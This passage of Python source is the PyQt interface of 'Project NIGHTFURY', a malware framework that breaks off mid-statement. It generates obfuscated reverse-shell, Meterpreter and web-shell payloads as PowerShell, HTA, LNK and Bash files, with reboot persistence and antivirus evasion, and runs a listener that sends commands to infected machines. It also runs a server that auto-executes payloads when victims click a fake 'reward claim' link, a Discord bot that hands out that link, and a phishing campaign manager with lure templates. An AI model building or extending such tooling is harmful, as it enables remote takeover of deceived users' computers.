class NightfuryGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Project NIGHTFURY v5.0 - OWASP Enhanced")
        self.setGeometry(100, 100, 1400, 900)
        
        # Initialize configuration
        self.config = {
            'lhost': self.get_public_ip(),
            'lport': 4444,
            'obfuscation_level': 5,
            'persistence': True,
            'evasion_techniques': True,
            'platform': "windows",
            'payload_type': "reverse_shell",
            'discord_token': "",
            'auto_server_port': 8080,
            'domain': "reward-center.org",
            'auto_start_server': False,
            'auto_start_bot': False
        }
        self.current_payload = None
        self.listener_thread = None
        self.http_server = None
        self.discord_bot = None
        self.active_connections = []
        self.connection_stats = []
        self.plugin_manager = PluginManager()
        
        # Create main tabs
        self.tabs = QTabWidget()
        self.tabs.setTabPosition(QTabWidget.West)
        self.tabs.setDocumentMode(True)
        self.setCentralWidget(self.tabs)
        
        # Create tabs
        self.create_dashboard_tab()
        self.create_config_tab()
        self.create_payload_tab()
        self.create_listener_tab()
        self.create_auto_execute_tab()
        self.create_plugins_tab()
        
        # Create status bar
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("✅ System Ready")
        
        # Create toolbar
        self.create_toolbar()
        
        # Apply dark theme
        self.apply_dark_theme()
        
        # Show banner
        self.show_banner()
        
        # Setup connection monitor
        self.connection_monitor = QTimer()
        self.connection_monitor.timeout.connect(self.update_connection_status)
        self.connection_monitor.start(1000)  # Check every second
        
        # Setup stats monitor
        self.stats_monitor = QTimer()
        self.stats_monitor.timeout.connect(self.update_stats)
        self.stats_monitor.start(5000)  # Update stats every 5 seconds
        
        # Load plugins
        self.load_plugins()
        
        # Setup system tray
        self.setup_system_tray()
    
    def create_toolbar(self):
        toolbar = QToolBar("Main Toolbar")
        toolbar.setIconSize(QSize(24, 24))
        self.addToolBar(toolbar)
        
        # Add actions
        start_action = QAction(QIcon.fromTheme("media-playback-start"), "Start Listener", self)
        start_action.triggered.connect(self.start_listener)
        toolbar.addAction(start_action)
        
        stop_action = QAction(QIcon.fromTheme("media-playback-stop"), "Stop Listener", self)
        stop_action.triggered.connect(self.stop_listener)
        toolbar.addAction(stop_action)
        
        toolbar.addSeparator()
        
        generate_action = QAction(QIcon.fromTheme("document-new"), "Generate Payload", self)
        generate_action.triggered.connect(self.generate_payload)
        toolbar.addAction(generate_action)
        
        save_action = QAction(QIcon.fromTheme("document-save"), "Save Payload", self)
        save_action.triggered.connect(self.save_payload)
        toolbar.addAction(save_action)
        
        toolbar.addSeparator()
        
        settings_action = QAction(QIcon.fromTheme("preferences-system"), "Settings", self)
        settings_action.triggered.connect(self.show_settings)
        toolbar.addAction(settings_action)
    
    def create_dashboard_tab(self):
        dashboard_tab = QWidget()
        layout = QVBoxLayout()
        dashboard_tab.setLayout(layout)
        self.tabs.addTab(dashboard_tab, "🏠 Dashboard")
        
        # Stats overview
        stats_group = QGroupBox("Overview")
        stats_layout = QHBoxLayout()
        
        # Connection stats
        conn_widget = QWidget()
        conn_layout = QVBoxLayout()
        self.conn_count = QLabel("0")
        self.conn_count.setAlignment(Qt.AlignCenter)
        self.conn_count.setStyleSheet("font-size: 24px; font-weight: bold; color: #61aeee;")
        conn_layout.addWidget(self.conn_count)
        conn_layout.addWidget(QLabel("Active Connections"))
        conn_widget.setLayout(conn_layout)
        stats_layout.addWidget(conn_widget)
        
        # Server stats
        server_widget = QWidget()
        server_layout = QVBoxLayout()
        self.server_status = QLabel("Stopped")
        self.server_status.setAlignment(Qt.AlignCenter)
        self.server_status.setStyleSheet("font-size: 24px; font-weight: bold; color: #e06c75;")
        server_layout.addWidget(self.server_status)
        server_layout.addWidget(QLabel("Auto-Server Status"))
        server_widget.setLayout(server_layout)
        stats_layout.addWidget(server_widget)
        
        # Bot stats
        bot_widget = QWidget()
        bot_layout = QVBoxLayout()
        self.bot_status_dash = QLabel("Stopped")
        self.bot_status_dash.setAlignment(Qt.AlignCenter)
        self.bot_status_dash.setStyleSheet("font-size: 24px; font-weight: bold; color: #e06c75;")
        bot_layout.addWidget(self.bot_status_dash)
        bot_layout.addWidget(QLabel("Discord Bot Status"))
        bot_widget.setLayout(bot_layout)
        stats_layout.addWidget(bot_widget)
        
        # Payload stats
        payload_widget = QWidget()
        payload_layout = QVBoxLayout()
        self.payload_count = QLabel("0")
        self.payload_count.setAlignment(Qt.AlignCenter)
        self.payload_count.setStyleSheet("font-size: 24px; font-weight: bold; color: #98c379;")
        payload_layout.addWidget(self.payload_count)
        payload_layout.addWidget(QLabel("Payloads Generated"))
        payload_widget.setLayout(payload_layout)
        stats_layout.addWidget(payload_widget)
        
        stats_group.setLayout(stats_layout)
        layout.addWidget(stats_group)
        
        # Connection graph
        graph_group = QGroupBox("Connection Activity")
        graph_layout = QVBoxLayout()
        self.connection_graph = ConnectionGraph()
        graph_layout.addWidget(self.connection_graph)
        graph_group.setLayout(graph_layout)
        layout.addWidget(graph_group)
        
        # Recent activity
        activity_group = QGroupBox("Recent Activity")
        activity_layout = QVBoxLayout()
        self.activity_list = QListWidget()
        activity_layout.addWidget(self.activity_list)
        activity_group.setLayout(activity_layout)
        layout.addWidget(activity_group)
    
    def create_config_tab(self):
        config_tab = QWidget()
        layout = QVBoxLayout()
        config_tab.setLayout(layout)
        self.tabs.addTab(config_tab, "⚙️ Configuration")
        
        # Network settings group
        network_group = QGroupBox("Network Settings")
        network_layout = QFormLayout()
        
        self.lhost_input = QLineEdit(self.config['lhost'])
        self.lhost_input.setPlaceholderText("Listener IP")
        network_layout.addRow("LHOST (Listener IP):", self.lhost_input)
        
        self.lport_input = QLineEdit(str(self.config['lport']))
        self.lport_input.setPlaceholderText("Listener Port")
        network_layout.addRow("LPORT (Listener Port):", self.lport_input)
        
        self.server_port_input = QLineEdit(str(self.config['auto_server_port']))
        self.server_port_input.setPlaceholderText("Auto-Execute Server Port")
        network_layout.addRow("Server Port:", self.server_port_input)
        
        self.domain_input = QLineEdit(self.config['domain'])
        self.domain_input.setPlaceholderText("Obfuscation Domain")
        network_layout.addRow("Obfuscation Domain:", self.domain_input)
        
        network_group.setLayout(network_layout)
        layout.addWidget(network_group)
        
        # Payload settings group
        payload_group = QGroupBox("Payload Settings")
        payload_layout = QFormLayout()
        
        self.platform_combo = QComboBox()
        self.platform_combo.addItems(["Windows", "Linux", "macOS"])
        self.platform_combo.setCurrentText(self.config['platform'].capitalize())
        payload_layout.addRow("Target Platform:", self.platform_combo)
        
        self.payload_type_combo = QComboBox()
        self.payload_type_combo.addItems(["Reverse Shell", "Meterpreter", "Bind Shell", "Web Shell"])
        payload_layout.addRow("Payload Type:", self.payload_type_combo)
        
        self.obf_level = QComboBox()
        self.obf_level.addItems(["1 (Low)", "2", "3", "4 (Recommended)", "5 (Maximum)"])
        self.obf_level.setCurrentIndex(3)
        payload_layout.addRow("Obfuscation Level:", self.obf_level)
        
        self.persistence_cb = QCheckBox("Enable persistence (survives reboot)")
        self.persistence_cb.setChecked(True)
        payload_layout.addRow(self.persistence_cb)
        
        self.evasion_cb = QCheckBox("Enable advanced evasion techniques")
        self.evasion_cb.setChecked(True)
        payload_layout.addRow(self.evasion_cb)
        
        payload_group.setLayout(payload_layout)
        layout.addWidget(payload_group)
        
        # API settings group
        api_group = QGroupBox("Discord Integration")
        api_layout = QFormLayout()
        
        self.discord_token_input = QLineEdit()
        self.discord_token_input.setPlaceholderText("Discord Bot Token")
        self.discord_token_input.setEchoMode(QLineEdit.PasswordEchoOnEdit)
        api_layout.addRow("Discord Token:", self.discord_token_input)
        
        api_group.setLayout(api_layout)
        layout.addWidget(api_group)
        
        # Auto-start settings
        auto_group = QGroupBox("Auto-Start Settings")
        auto_layout = QVBoxLayout()
        
        self.auto_server_cb = QCheckBox("Start auto-execution server on application launch")
        auto_layout.addWidget(self.auto_server_cb)
        
        self.auto_bot_cb = QCheckBox("Start Discord bot on application launch")
        auto_layout.addWidget(self.auto_bot_cb)
        
        auto_group.setLayout(auto_layout)
        layout.addWidget(auto_group)
        
        # Save button
        save_btn = ModernButton("Save Configuration")
        save_btn.clicked.connect(self.save_config)
        save_btn.setFixedHeight(40)
        layout.addWidget(save_btn)
    
    def create_payload_tab(self):
        payload_tab = QWidget()
        layout = QVBoxLayout()
        payload_tab.setLayout(layout)
        self.tabs.addTab(payload_tab, "🔧 Payload")
        
        # Payload generation options
        options_group = QGroupBox("Generation Options")
        options_layout = QHBoxLayout()
        
        self.gen_ps_btn = ModernButton("Generate PowerShell")
        self.gen_ps_btn.clicked.connect(lambda: self.generate_payload("windows"))
        options_layout.addWidget(self.gen_ps_btn)
        
        self.gen_hta_btn = ModernButton("Generate HTA")
        self.gen_hta_btn.clicked.connect(self.generate_hta)
        options_layout.addWidget(self.gen_hta_btn)
        
        self.gen_lnk_btn = ModernButton("Generate LNK")
        self.gen_lnk_btn.clicked.connect(self.generate_lnk)
        options_layout.addWidget(self.gen_lnk_btn)
        
        self.gen_bash_btn = ModernButton("Generate Bash")
        self.gen_bash_btn.clicked.connect(lambda: self.generate_payload("linux"))
        options_layout.addWidget(self.gen_bash_btn)
        
        options_group.setLayout(options_layout)
        layout.addWidget(options_group)
        
        # Payload preview
        payload_preview_group = QGroupBox("Payload Preview")
        payload_preview_layout = QVBoxLayout()
        
        self.payload_preview = QTextEdit()
        self.payload_preview.setReadOnly(True)
        self.payload_preview.setPlaceholderText("Payload will appear here after generation")
        payload_preview_layout.addWidget(self.payload_preview)
        
        # Save buttons
        save_btn_layout = QHBoxLayout()
        self.save_btn = ModernButton("Save to File")
        self.save_btn.setEnabled(False)
        self.save_btn.clicked.connect(self.save_payload)
        save_btn_layout.addWidget(self.save_btn)
        
        self.copy_btn = ModernButton("Copy to Clipboard")
        self.copy_btn.setEnabled(False)
        self.copy_btn.clicked.connect(self.copy_payload)
        save_btn_layout.addWidget(self.copy_btn)
        
        self.test_btn = ModernButton("Test in Sandbox")
        self.test_btn.setEnabled(False)
        self.test_btn.clicked.connect(self.test_payload)
        save_btn_layout.addWidget(self.test_btn)
        
        payload_preview_layout.addLayout(save_btn_layout)
        payload_preview_group.setLayout(payload_preview_layout)
        layout.addWidget(payload_preview_group)
    
    def create_listener_tab(self):
        listener_tab = QWidget()
        layout = QVBoxLayout()
        listener_tab.setLayout(layout)
        self.tabs.addTab(listener_tab, "👂 Listener")
        
        # Listener controls
        controls_group = QGroupBox("Listener Controls")
        controls_layout = QHBoxLayout()
        
        self.start_btn = ModernButton("Start Listener")
        self.start_btn.clicked.connect(self.start_listener)
        controls_layout.addWidget(self.start_btn)
        
        self.stop_btn = ModernButton("Stop Listener")
        self.stop_btn.setEnabled(False)
        self.stop_btn.clicked.connect(self.stop_listener)
        controls_layout.addWidget(self.stop_btn)
        
        controls_group.setLayout(controls_layout)
        layout.addWidget(controls_group)
        
        # Connection status
        status_group = QGroupBox("Connection Status")
        status_layout = QVBoxLayout()
        
        self.connection_status = QLabel("Listener not running")
        self.connection_status.setAlignment(Qt.AlignCenter)
        self.connection_status.setStyleSheet("font-weight: bold; font-size: 14px;")
        status_layout.addWidget(self.connection_status)
        
        # Splitter for connections and command execution
        splitter = QSplitter(Qt.Horizontal)
        
        # Connections list
        conn_widget = QWidget()
        conn_layout = QVBoxLayout()
        conn_layout.addWidget(QLabel("Active Connections:"))
        self.connections_list = QListWidget()
        conn_layout.addWidget(self.connections_list)
        conn_widget.setLayout(conn_layout)
        splitter.addWidget(conn_widget)
        
        # Command execution
        command_widget = QWidget()
        command_layout = QVBoxLayout()
        command_layout.addWidget(QLabel("Command Execution:"))
        
        self.command_input = QLineEdit()
        self.command_input.setPlaceholderText("Enter command to execute on connected clients")
        self.command_input.setEnabled(False)
        command_layout.addWidget(self.command_input)
        
        self.send_btn = ModernButton("Send Command")
        self.send_btn.setEnabled(False)
        self.send_btn.clicked.connect(self.send_command)
        command_layout.addWidget(self.send_btn)
        
        self.command_output = QTextEdit()
        self.command_output.setReadOnly(True)
        self.command_output.setPlaceholderText("Command output will appear here")
        command_layout.addWidget(self.command_output)
        
        command_widget.setLayout(command_layout)
        splitter.addWidget(command_widget)
        
        # Set splitter sizes
        splitter.setSizes([300, 500])
        status_layout.addWidget(splitter)
        
        status_group.setLayout(status_layout)
        layout.addWidget(status_group)
    
    def create_auto_execute_tab(self):
        auto_tab = QWidget()
        layout = QVBoxLayout()
        auto_tab.setLayout(layout)
        self.tabs.addTab(auto_tab, "🚀 Auto-Execution")
        
        # Auto-Execute Server Section
        server_group = QGroupBox("Auto-Execute Server")
        server_layout = QVBoxLayout()
        
        server_info = QLabel("This server delivers payloads that auto-execute when users click the reward claim link")
        server_info.setWordWrap(True)
        server_layout.addWidget(server_info)
        
        # Server controls
        server_controls = QHBoxLayout()
        
        self.start_server_btn = ModernButton("Start Auto-Server")
        self.start_server_btn.clicked.connect(self.start_auto_server)
        server_controls.addWidget(self.start_server_btn)
        
        self.stop_server_btn = ModernButton("Stop Auto-Server")
        self.stop_server_btn.setEnabled(False)
        self.stop_server_btn.clicked.connect(self.stop_auto_server)
        server_controls.addWidget(self.stop_server_btn)
        
        server_layout.addLayout(server_controls)
        
        # Server URL display
        self.server_url = QLineEdit()
        self.server_url.setReadOnly(True)
        self.server_url.setPlaceholderText("Server URL will appear here after starting")
        server_layout.addWidget(self.server_url)
        
        # Copy URL button
        copy_url_btn = ModernButton("Copy Claim URL")
        copy_url_btn.clicked.connect(self.copy_claim_url)
        server_layout.addWidget(copy_url_btn)
        
        # QR code display
        self.qr_label = QLabel()
        self.qr_label.setAlignment(Qt.AlignCenter)
        self.qr_label.setMinimumSize(200, 200)
        server_layout.addWidget(self.qr_label)
        
        server_group.setLayout(server_layout)
        layout.addWidget(server_group)
        
        # Discord Bot Section
        discord_group = QGroupBox("Discord Command Integration")
        discord_layout = QVBoxLayout()
        
        discord_info = QLabel("The bot will respond to '!claim bonus' commands with an auto-execute link")
        discord_info.setWordWrap(True)
        discord_layout.addWidget(discord_info)
        
        # Bot controls
        bot_controls = QHBoxLayout()
        
        self.start_bot_btn = ModernButton("Start Discord Bot")
        self.start_bot_btn.clicked.connect(self.start_discord_bot)
        bot_controls.addWidget(self.start_bot_btn)
        
        self.stop_bot_btn = ModernButton("Stop Discord Bot")
        self.stop_bot_btn.setEnabled(False)
        self.stop_bot_btn.clicked.connect(self.stop_discord_bot)
        bot_controls.addWidget(self.stop_bot_btn)
        
        discord_layout.addLayout(bot_controls)
        
        # Bot status
        self.bot_status = QLabel("Bot status: Not running")
        discord_layout.addWidget(self.bot_status)
        
        discord_group.setLayout(discord_layout)
        layout.addWidget(discord_group)
        
        # Phishing Campaign Section
        phishing_group = QGroupBox("Phishing Campaign")
        phishing_layout = QVBoxLayout()
        
        phishing_info = QLabel("Create and manage phishing campaigns with tracking")
        phishing_info.setWordWrap(True)
        phishing_layout.addWidget(phishing_info)
        
        # Campaign controls
        campaign_controls = QHBoxLayout()
        
        self.create_campaign_btn = ModernButton("Create Campaign")
        self.create_campaign_btn.clicked.connect(self.create_campaign)
        campaign_controls.addWidget(self.create_campaign_btn)
        
        self.view_stats_btn = ModernButton("View Statistics")
        self.view_stats_btn.clicked.connect(self.view_campaign_stats)
        campaign_controls.addWidget(self.view_stats_btn)
        
        phishing_layout.addLayout(campaign_controls)
        
        phishing_group.setLayout(phishing_layout)
        layout.addWidget(phishing_group)
    
    def create_plugins_tab(self):
        plugins_tab = QWidget()
        layout = QVBoxLayout()
        plugins_tab.setLayout(layout)
        self.tabs.addTab(plugins_tab, "🔌 Plugins")
        
        # Plugin browser
        browser_group = QGroupBox("Available Plugins")
        browser_layout = QVBoxLayout()
        
        self.plugin_list = QListWidget()
        browser_layout.addWidget(self.plugin_list)
        
        browser_group.setLayout(browser_layout)
        layout.addWidget(browser_group)
        
        # Plugin controls
        controls_group = QGroupBox("Plugin Controls")
        controls_layout = QHBoxLayout()
        
        self.load_plugin_btn = ModernButton("Load Plugin")
        self.load_plugin_btn.clicked.connect(self.load_plugin)
        controls_layout.addWidget(self.load_plugin_btn)
        
        self.unload_plugin_btn = ModernButton("Unload Plugin")
        self.unload_plugin_btn.clicked.connect(self.unload_plugin)
        controls_layout.addWidget(self.unload_plugin_btn)
        
        self.configure_plugin_btn = ModernButton("Configure Plugin")
        self.configure_plugin_btn.clicked.connect(self.configure_plugin)
        controls_layout.addWidget(self.configure_plugin_btn)
        
        controls_group.setLayout(controls_layout)
        layout.addWidget(controls_group)
        
        # Plugin info
        info_group = QGroupBox("Plugin Information")
        info_layout = QVBoxLayout()
        
        self.plugin_info = QTextEdit()
        self.plugin_info.setReadOnly(True)
        self.plugin_info.setPlaceholderText("Plugin information will appear here")
        info_layout.addWidget(self.plugin_info)
        
        info_group.setLayout(info_layout)
        layout.addWidget(info_group)
    
    def apply_dark_theme(self):
        dark_palette = QPalette()
        dark_palette.setColor(QPalette.Window, QColor(40, 44, 52))
        dark_palette.setColor(QPalette.WindowText, QColor(220, 220, 220))
        dark_palette.setColor(QPalette.Base, QColor(30, 32, 38))
        dark_palette.setColor(QPalette.AlternateBase, QColor(40, 44, 52))
        dark_palette.setColor(QPalette.ToolTipBase, QColor(220, 220, 220))
        dark_palette.setColor(QPalette.ToolTipText, QColor(220, 220, 220))
        dark_palette.setColor(QPalette.Text, QColor(220, 220, 220))
        dark_palette.setColor(QPalette.Button, QColor(61, 142, 255))
        dark_palette.setColor(QPalette.ButtonText, QColor(255, 255, 255))
        dark_palette.setColor(QPalette.BrightText, Qt.red)
        dark_palette.setColor(QPalette.Highlight, QColor(61, 142, 255))
        dark_palette.setColor(QPalette.HighlightedText, Qt.black)
        
        self.setPalette(dark_palette)
        
        # Set style
        self.setStyleSheet("""
            QGroupBox {
                border: 1px solid #4a4a4a;
                border-radius: 8px;
                margin-top: 1ex;
                font-weight: bold;
                color: #61aeee;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: #61aeee;
            }
            QTextEdit, QListWidget, QLineEdit {
                background-color: #282c34;
                color: #abb2bf;
                border: 1px solid #4a4a4a;
                border-radius: 5px;
                padding: 8px;
                font-family: 'Consolas';
            }
            QPushButton {
                background-color: #3d8eff;
                color: white;
                border: none;
                border-radius: 5px;
                padding: 8px 16px;
                min-height: 30px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #5a9cff;
            }
            QPushButton:disabled {
                background-color: #555;
            }
            QTabWidget::pane {
                border: 1px solid #4a4a4a;
                background: #282c34;
            }
            QTabBar::tab {
                background: #282c34;
                color: #abb2bf;
                padding: 10px;
                border: 1px solid #4a4a4a;
                border-bottom: none;
                border-top-left-radius: 5px;
                border-top-right-radius: 5px;
                font-weight: bold;
            }
            QTabBar::tab:selected {
                background: #3d8eff;
                color: white;
                border-color: #4a4a4a;
            }
            QProgressBar {
                border: 1px solid #4a4a4a;
                border-radius: 5px;
                text-align: center;
                background: #282c34;
                height: 20px;
            }
            QProgressBar::chunk {
                background-color: #3d8eff;
                width: 10px;
            }
            QStatusBar {
                background: #21252b;
                color: #abb2bf;
                padding: 4px;
            }
            QToolBar {
                background: #21252b;
                border: none;
                spacing: 5px;
            }
            QToolButton {
                background: #3d8eff;
                color: white;
                border: none;
                border-radius: 4px;
                padding: 5px;
            }
            QToolButton:hover {
                background: #5a9cff;
            }
            QSplitter::handle {
                background: #4a4a4a;
            }
        """)
    
    def show_banner(self):
        banner = """
  ███╗   ██╗██╗ ██████╗ ██╗  ██╗████████╗███████╗██╗   ██╗██████╗ ██╗   ██╗
  ████╗  ██║██║██╔════╝ ██║  ██║╚══██╔══╝██╔════╝██║   ██║██╔══██╗╚██╗ ██╔╝
  ██╔██╗ ██║██║██║  ███╗███████║   ██║   █████╗  ██║   ██║██████╔╝ ╚████╔╝ 
  ██║╚██╗██║██║██║   ██║██╔══██║   ██║   ██╔══╝  ██║   ██║██╔══██╗  ╚██╔╝  
  ██║ ╚████║██║╚██████╔╝██║  ██║   ██║   ██║     ╚██████╔╝██║  ██║   ██║   
  ╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
  
  Version 5.0 - OWASP Enhanced Edition
  Advanced Payload Framework with Multi-Platform Support
        """
        print(banner)
    
    def setup_system_tray(self):
        if not QSystemTrayIcon.isSystemTrayAvailable():
            return
            
        self.tray_icon = QSystemTrayIcon(self)
        self.tray_icon.setIcon(self.style().standardIcon(QStyle.SP_ComputerIcon))
        
        tray_menu = QMenu()
        
        show_action = QAction("Show", self)
        show_action.triggered.connect(self.show)
        tray_menu.addAction(show_action)
        
        hide_action = QAction("Hide", self)
        hide_action.triggered.connect(self.hide)
        tray_menu.addAction(hide_action)
        
        tray_menu.addSeparator()
        
        quit_action = QAction("Quit", self)
        quit_action.triggered.connect(QApplication.quit)
        tray_menu.addAction(quit_action)
        
        self.tray_icon.setContextMenu(tray_menu)
        self.tray_icon.show()
    
    def load_plugins(self):
        # Load built-in plugins
        # This is a placeholder - in a real implementation, you would scan a plugins directory
        self.plugin_manager.register_plugin("AV Evasion", AVEvasionPlugin)
        self.plugin_manager.register_plugin("Persistence", PersistencePlugin)
        self.plugin_manager.register_plugin("Lateral Movement", LateralMovementPlugin)
        
        # Populate plugin list
        for plugin_name in self.plugin_manager.list_plugins():
            self.plugin_list.addItem(plugin_name)
    
    def load_plugin(self):
        selected_items = self.plugin_list.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "Warning", "Please select a plugin to load")
            return
            
        plugin_name = selected_items[0].text()
        plugin = self.plugin_manager.load_plugin(plugin_name, self)
        
        if plugin:
            self.plugin_info.setText(f"Loaded plugin: {plugin.name}\nVersion: {plugin.version}\n\n{plugin.description}")
            self.activity_list.addItem(f"[+] Loaded plugin: {plugin.name}")
        else:
            QMessageBox.warning(self, "Error", f"Failed to load plugin: {plugin_name}")
    
    def unload_plugin(self):
        selected_items = self.plugin_list.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "Warning", "Please select a plugin to unload")
            return
            
        plugin_name = selected_items[0].text()
        if plugin_name in self.plugin_manager.loaded_plugins:
            del self.plugin_manager.loaded_plugins[plugin_name]
            self.plugin_info.clear()
            self.activity_list.addItem(f"[-] Unloaded plugin: {plugin_name}")
        else:
            QMessageBox.warning(self, "Error", f"Plugin {plugin_name} is not loaded")
    
    def configure_plugin(self):
        selected_items = self.plugin_list.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "Warning", "Please select a plugin to configure")
            return
            
        plugin_name = selected_items[0].text()
        plugin = self.plugin_manager.get_plugin(plugin_name)
        
        if plugin:
            # Show plugin configuration dialog
            dialog = QDialog(self)
            dialog.setWindowTitle(f"Configure {plugin.name}")
            dialog.setModal(True)
            dialog.setMinimumWidth(400)
            
            layout = QVBoxLayout()
            layout.addWidget(QLabel(f"Configuration options for {plugin.name}"))
            
            # Add plugin-specific configuration options here
            
            buttons = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
            buttons.accepted.connect(dialog.accept)
            buttons.rejected.connect(dialog.reject)
            layout.addWidget(buttons)
            
            dialog.setLayout(layout)
            
            if dialog.exec_() == QDialog.Accepted:
                self.activity_list.addItem(f"[*] Configured plugin: {plugin.name}")
        else:
            QMessageBox.warning(self, "Error", f"Plugin {plugin_name} is not loaded")
    
    def create_campaign(self):
        dialog = QDialog(self)
        dialog.setWindowTitle("Create Phishing Campaign")
        dialog.setModal(True)
        dialog.setMinimumWidth(500)
        
        layout = QVBoxLayout()
        
        form_layout = QFormLayout()
        
        campaign_name = QLineEdit()
        campaign_name.setPlaceholderText("Enter campaign name")
        form_layout.addRow("Campaign Name:", campaign_name)
        
        target_email = QLineEdit()
        target_email.setPlaceholderText("Enter target email address")
        form_layout.addRow("Target Email:", target_email)
        
        subject = QLineEdit()
        subject.setPlaceholderText("Enter email subject")
        form_layout.addRow("Subject:", subject)
        
        template = QComboBox()
        template.addItems(["Reward Notification", "Security Alert", "Password Reset", "Invoice"])
        form_layout.addRow("Template:", template)
        
        layout.addLayout(form_layout)
        
        buttons = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        buttons.accepted.connect(dialog.accept)
        buttons.rejected.connect(dialog.reject)
        layout.addWidget(buttons)
        
        dialog.setLayout(layout)
        
        if dialog.exec_() == QDialog.Accepted:
            self.activity_list.addItem(f"[+] Created phishing campaign: {campaign_name.text()}")
            QMessageBox.information(self, "Success", "Phishing campaign created successfully")
    
    def view_campaign_stats(self):
        dialog = QDialog(self)
        dialog.setWindowTitle("Campaign Statistics")
        dialog.setModal(True)
        dialog.setMinimumSize(600, 400)
        
        layout = QVBoxLayout()
        
        # Create a simple table with mock data
        table = QTableWidget()
        table.setColumnCount(4)
        table.setHorizontalHeaderLabels(["Campaign", "Sent", "Clicked", "Executed"])
        
        # Add some mock data
        table.setRowCount(3)
        table.setItem(0, 0, QTableWidgetItem("Reward Campaign"))
        table.setItem(0, 1, QTableWidgetItem("100"))
        table.setItem(0, 2, QTableWidgetItem("45"))
        table.setItem(0, 3, QTableWidgetItem("22"))
        
        table.setItem(1, 0, QTableWidgetItem("Security Alert"))
        table.setItem(1, 1, QTableWidgetItem("80"))
        table.setItem(1, 2, QTableWidgetItem("32"))
        table.setItem(1, 3, QTableWidgetItem("15"))
        
        table.setItem(2, 0, QTableWidgetItem("Password Reset"))
        table.setItem(2, 1, QTableWidgetItem("120"))
        table.setItem(2, 2, QTableWidgetItem("65"))
        table.setItem(2, 3, QTableWidgetItem("38"))
        
        table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        layout.addWidget(table)
        
        buttons = QDialogButtonBox(QDialogButtonBox.Close)
        buttons.rejected.connect(dialog.reject)
        layout.addWidget(buttons)
        
        dialog.setLayout(layout)
        dialog.exec_()
    
    def test_payload(self):
        if not self.current_payload:
            QMessageBox.warning(self, "Warning", "No payload generated to test")
            return
            
        dialog = QDialog(self)
        dialog.setWindowTitle("Test Payload in Sandbox")
        dialog.setModal(True)
        dialog.setMinimumWidth(400)
        
        layout = QVBoxLayout()
        layout.addWidget(QLabel("Testing payload in isolated environment..."))
        
        progress = QProgressBar()
        progress.setRange(0, 0)  # Indeterminate progress
        layout.addWidget(progress)
        
        result = QLabel()
        result.setWordWrap(True)
        layout.addWidget(result)
        
        buttons = QDialogButtonBox(QDialogButtonBox.Ok)
        buttons.accepted.connect(dialog.accept)
        buttons.setEnabled(False)
        layout.addWidget(buttons)
        
        dialog.setLayout(layout)
        
        # Simulate testing process
        def update_test():
            time.sleep(3)  # Simulate testing time
            result.setText("✅ Payload passed basic evasion tests\n\n❌ Detected by 2/26 AV engines\n\n⚠️  Recommend increasing obfuscation level")
            progress.setRange(0, 100)
            progress.setValue(100)
            buttons.setEnabled(True)
            
        threading.Thread(target=update_test, daemon=True).start()
        
        dialog.exec_()
    
    def get_public_ip(self):
        try:
            return requests.get('https://api.ipify.org').text
        except:
            return "127.0.0.1"
    
    def save_config(self):
        try:
            self.config['lhost'] = self.lhost_input.text()
            self.config['lport'] = int(self.lport_input.text())
            self.config['auto_server_port'] = int(self.server_port_input.text())
            self.config['domain'] = self.domain_input.text()
            self.config['obfuscation_level'] = self.obf_level.currentIndex() + 1
            self.config['persistence'] = self.persistence_cb.isChecked()
            self.config['evasion_techniques'] = self.evasion_cb.isChecked()
            self.config['platform'] = self.platform_combo.currentText().lower()
            self.config['payload_type'] = self.payload_type_combo.currentText().lower().replace(' ', '_')
            self.config['discord_token'] = self.discord_token_input.text()
            self.config['auto_start_server'] = self.auto_server_cb.isChecked()
            self.config['auto_start_bot'] = self.auto_bot_cb.isChecked()
            
            self.status_bar.showMessage("✅ Configuration saved", 3000)
            self.activity_list.addItem("[*] Configuration saved")
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def generate_payload(self, platform=None):
        try:
            self.save_config()
            
            target_platform = platform or self.config['platform']
            payload = NightfuryPayload(
                self.config['lhost'],
                self.config['lport'],
                self.config['obfuscation_level'],
                self.config['persistence'],
                self.config['evasion_techniques'],
                target_platform,
                self.config['payload_type']
            )
            self.current_payload = payload.generate()
            
            # Display payload
            self.payload_preview.setPlainText(self.current_payload)
            self.save_btn.setEnabled(True)
            self.copy_btn.setEnabled(True)
            self.test_btn.setEnabled(True)
            
            self.status_bar.showMessage("✅ Payload generated successfully", 3000)
            self.activity_list.addItem(f"[+] Generated {target_platform} payload")
            
            # Update payload count
            current_count = int(self.payload_count.text())
            self.payload_count.setText(str(current_count + 1))
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def generate_hta(self):
        try:
            self.save_config()
            
            payload = NightfuryPayload(
                self.config['lhost'],
                self.config['lport'],
                self.config['obfuscation_level'],
                self.config['persistence'],
                self.config['evasion_techniques'],
                "windows",
                self.config['payload_type']
            )
            hta_content = payload.generate_hta()
            self.current_payload = hta_content
            
            # Display HTA content
            self.payload_preview.setPlainText(self.current_payload)
            self.save_btn.setEnabled(True)
            self.copy_btn.setEnabled(True)
            self.test_btn.setEnabled(True)
            
            self.status_bar.showMessage("✅ HTA payload generated successfully", 3000)
            self.activity_list.addItem("[+] Generated HTA payload")
            
            # Update payload count
            current_count = int(self.payload_count.text())
            self.payload_count.setText(str(current_count + 1))
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def generate_lnk(self):
        try:
            self.save_config()
            
            payload = NightfuryPayload(
                self.config['lhost'],
                self.config['lport'],
                self.config['obfuscation_level'],
                self.config['persistence'],
                self.config['evasion_techniques'],
                "windows",
                self.config['payload_type']
            )
            
            # Generate LNK file
            filename, _ = QFileDialog.getSaveFileName(
